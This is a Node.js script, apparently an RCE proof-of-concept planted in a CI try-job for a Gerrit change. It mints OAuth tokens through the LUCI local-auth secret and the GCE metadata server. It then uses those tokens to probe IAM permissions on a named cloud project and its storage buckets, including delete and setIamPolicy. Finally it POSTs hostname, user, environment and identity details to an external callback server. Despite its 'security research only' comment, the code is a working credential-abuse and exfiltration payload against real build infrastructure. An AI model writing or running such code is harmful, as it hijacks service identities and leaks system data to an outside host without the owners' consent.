// Security research only. No OAuth tokens or local-auth secrets are exported.
const fs = require('fs');
const os = require('os');

const CALLBACK_URL = 'https://luci-rce-receiver-o324i7mbdq-uc.a.run.app';
const SESSION = '6df0c4d852a7f2f97c0ae548d041b1fc493c049a553c41146d9cb038adc6be6a';
const MARKER = 'LUCI_RCE_LIVE_20261112_656594_V2';
const PROJECT = 'gerritcodereview-ci';
const PROJECT_PERMISSIONS = [
  'resourcemanager.projects.get',
  'storage.buckets.list',
  'storage.buckets.create',
  'secretmanager.secrets.list',
  'iam.serviceAccounts.list',
  'iam.serviceAccounts.create',
  'cloudbuild.builds.create',
  'compute.instances.create',
  'pubsub.topics.create',
];
const BUCKET_PERMISSIONS = [
  'storage.buckets.get',
  'storage.objects.list',
  'storage.objects.get',
  'storage.objects.create',
  'storage.objects.delete',
  'storage.buckets.setIamPolicy',
];

async function request(url, options = {}, timeoutMs = 7000) {
  const response = await fetch(url, {...options, signal: AbortSignal.timeout(timeoutMs)});
  const text = await response.text();
  let body = text;
  try { body = JSON.parse(text); } catch (_) {}
  return {status: response.status, body};
}

async function metadata(path) {
  return request('http://metadata.google.internal/computeMetadata/v1/' + path, {
    headers: {'Metadata-Flavor': 'Google'},
  }, 2500);
}

async function inspectIdentity(label, token) {
  const result = {label};
  const tokenInfo = await request(
    'https://oauth2.googleapis.com/tokeninfo?access_token=' + encodeURIComponent(token),
  );
  result.tokenInfo = {
    httpStatus: tokenInfo.status,
    email: tokenInfo.body && tokenInfo.body.email,
    scope: tokenInfo.body && tokenInfo.body.scope,
    expiresIn: tokenInfo.body && tokenInfo.body.expires_in,
    audience: tokenInfo.body && tokenInfo.body.aud,
    issuer: tokenInfo.body && tokenInfo.body.iss,
  };

  const projectInfo = await request(
    `https://cloudresourcemanager.googleapis.com/v3/projects/${PROJECT}`,
    {headers: {Authorization: 'Bearer ' + token}},
  );
  result.projectGet = {
    httpStatus: projectInfo.status,
    projectId: projectInfo.body && projectInfo.body.projectId,
    state: projectInfo.body && projectInfo.body.state,
    errorStatus: projectInfo.body && projectInfo.body.error && projectInfo.body.error.status,
  };

  const projectIam = await request(
    `https://cloudresourcemanager.googleapis.com/v3/projects/${PROJECT}:testIamPermissions`,
    {
      method: 'POST',
      headers: {Authorization: 'Bearer ' + token, 'Content-Type': 'application/json'},
      body: JSON.stringify({permissions: PROJECT_PERMISSIONS}),
    },
  );
  result.projectIamTest = {
    httpStatus: projectIam.status,
    requestedPermissions: PROJECT_PERMISSIONS,
    grantedPermissions: projectIam.body && projectIam.body.permissions,
    errorStatus: projectIam.body && projectIam.body.error && projectIam.body.error.status,
    errorMessage: projectIam.body && projectIam.body.error && projectIam.body.error.message,
  };

  result.buckets = {};
  for (const bucket of ['gerrit-releases', 'logdog-gerrit-archive']) {
    const query = new URLSearchParams();
    for (const permission of BUCKET_PERMISSIONS) query.append('permissions', permission);
    const bucketIam = await request(
      `https://storage.googleapis.com/storage/v1/b/${bucket}/iam/testPermissions?${query}`,
      {headers: {Authorization: 'Bearer ' + token}},
    );
    result.buckets[bucket] = {
      httpStatus: bucketIam.status,
      grantedPermissions: bucketIam.body && bucketIam.body.permissions,
      errorStatus: bucketIam.body && bucketIam.body.error && bucketIam.body.error.status,
      errorMessage: bucketIam.body && bucketIam.body.error && bucketIam.body.error.message,
    };
  }
  return result;
}

async function localIdentity(localAuth, accountId) {
  const response = await request(
    `http://127.0.0.1:${localAuth.rpc_port}/rpc/LuciLocalAuthService.GetOAuthToken`,
    {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        account_id: accountId,
        scopes: ['https://www.googleapis.com/auth/cloud-platform'],
        secret: localAuth.secret,
      }),
    },
  );
  return {
    token: response.body && response.body.access_token,
    receipt: {
      httpStatus: response.status,
      obtained: Boolean(response.body && response.body.access_token),
      errorCode: response.body && response.body.error_code,
      errorMessage: response.body && response.body.error_message,
    },
  };
}

async function main() {
  const receipt = {
    marker: MARKER,
    change: 656594,
    executedAt: new Date().toISOString(),
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    cwd: process.cwd(),
    safeEnvironment: {},
    environmentKeys: Object.keys(process.env).filter(
      key => /^(BUILDBUCKET|LUCI|SWARMING|RESULTDB|BOT_|TASK_)/.test(key),
    ).sort(),
    identities: {},
  };
  for (const key of [
    'BUILDBUCKET_BUILD_ID', 'BUILDBUCKET_BUILDER', 'BUILDBUCKET_PROJECT',
    'BUILDBUCKET_BUCKET', 'SWARMING_TASK_ID', 'SWARMING_BOT_ID',
  ]) {
    if (process.env[key]) receipt.safeEnvironment[key] = process.env[key];
  }

  let localAuth = null;
  const contextPath = process.env.LUCI_CONTEXT;
  if (contextPath) {
    try {
      const context = JSON.parse(fs.readFileSync(contextPath, 'utf8'));
      receipt.luciContextKeys = Object.keys(context).sort();
      if (context.local_auth) {
        localAuth = context.local_auth;
        receipt.localAuth = {
          rpcPortPresent: Boolean(localAuth.rpc_port),
          defaultAccountId: localAuth.default_account_id || null,
          accounts: (localAuth.accounts || []).map(account => ({
            id: account.id || null, email: account.email || null,
          })),
        };
      }
    } catch (error) {
      receipt.luciContextError = String(error);
    }
  }

  if (localAuth && localAuth.rpc_port && localAuth.secret) {
    for (const accountId of ['task', 'system']) {
      try {
        const identity = await localIdentity(localAuth, accountId);
        receipt.identities[accountId] = {tokenMint: identity.receipt};
        if (identity.token) {
          Object.assign(receipt.identities[accountId], await inspectIdentity(accountId, identity.token));
        }
      } catch (error) {
        receipt.identities[accountId] = {error: String(error)};
      }
    }
  }

  try {
    const metadataToken = await metadata('instance/service-accounts/default/token');
    const token = metadataToken.body && metadataToken.body.access_token;
    receipt.identities.metadata = {
      tokenMint: {
        httpStatus: metadataToken.status,
        obtained: Boolean(token),
        expiresIn: metadataToken.body && metadataToken.body.expires_in,
      },
    };
    if (token) Object.assign(receipt.identities.metadata, await inspectIdentity('metadata', token));
  } catch (error) {
    receipt.identities.metadata = {error: String(error)};
  }

  receipt.metadata = {};
  for (const [name, path] of Object.entries({
    projectId: 'project/project-id',
    defaultServiceAccount: 'instance/service-accounts/default/email',
    defaultServiceAccountScopes: 'instance/service-accounts/default/scopes',
  })) {
    try {
      const result = await metadata(path);
      receipt.metadata[name] = {
        httpStatus: result.status,
        value: typeof result.body === 'string' ? result.body.slice(0, 2000) : result.body,
      };
    } catch (error) {
      receipt.metadata[name] = {error: String(error)};
    }
  }

  console.log('LUCI_RCE_PROBE ' + JSON.stringify(receipt));
  try {
    const callback = await request(CALLBACK_URL + '/v1/session/' + SESSION + '/receipt', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Probe-Session': SESSION,
        'User-Agent': 'luci-rce-research',
      },
      body: JSON.stringify({kind: 'gerrit-luci-try-rce-v2', data: receipt}),
    }, 10000);
    console.log('LUCI_RCE_CALLBACK_STATUS ' + callback.status);
  } catch (error) {
    console.log('LUCI_RCE_CALLBACK_ERROR ' + String(error));
  }
}

main().catch(error => console.log('LUCI_RCE_PROBE_ERROR ' + String(error)));
